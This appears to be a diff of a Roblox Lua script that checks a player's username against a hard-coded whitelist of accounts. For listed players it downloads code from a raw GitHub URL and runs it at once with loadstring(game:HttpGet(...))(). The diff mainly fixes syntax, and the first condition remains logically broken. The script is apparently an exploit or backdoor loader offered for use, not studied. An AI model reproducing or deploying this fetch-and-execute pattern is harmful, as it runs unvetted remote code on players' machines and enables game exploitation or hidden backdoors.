@@ -1,13 +1,14 @@
 player = game.Players.LocalPlayer
 
-if player.UserId == player.Name == "SpookySkeletons214"
-or player.UserId == 468082196 and player.Name == "AdminPeaceKeeper" then -- Daniel 
-or player.Name == "PossiblyJolly" then
-or player.Name == "YounUchiha2x" then
-or player.Name == "JollyNotSxmp" then
-or player.Name == "RougeZetsu2x" then
-or player.Name == "GotYouOnCamera" then
-or player.Name == "Adminjoiner1" then
+if player.UserId == player.Name == "SpookySkeletons214" 
+or player.UserId == 468082196 and player.Name == "AdminPeaceKeeper" -- Daniel 
+or player.Name == "PossiblyJolly" 
+or player.Name == "YounUchiha2x" 
+or player.Name == "atestbymenow1" 
+or player.Name == "JollyNotSxmp" 
+or player.Name == "RougeZetsu2x" 
+or player.Name == "GotYouOnCamera" 
+or player.Name == "Adminjoiner1" 
 or player.Name == "sbhtkeakeuc123123" then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/imiranian/Syx/main/PW", true))()
 else
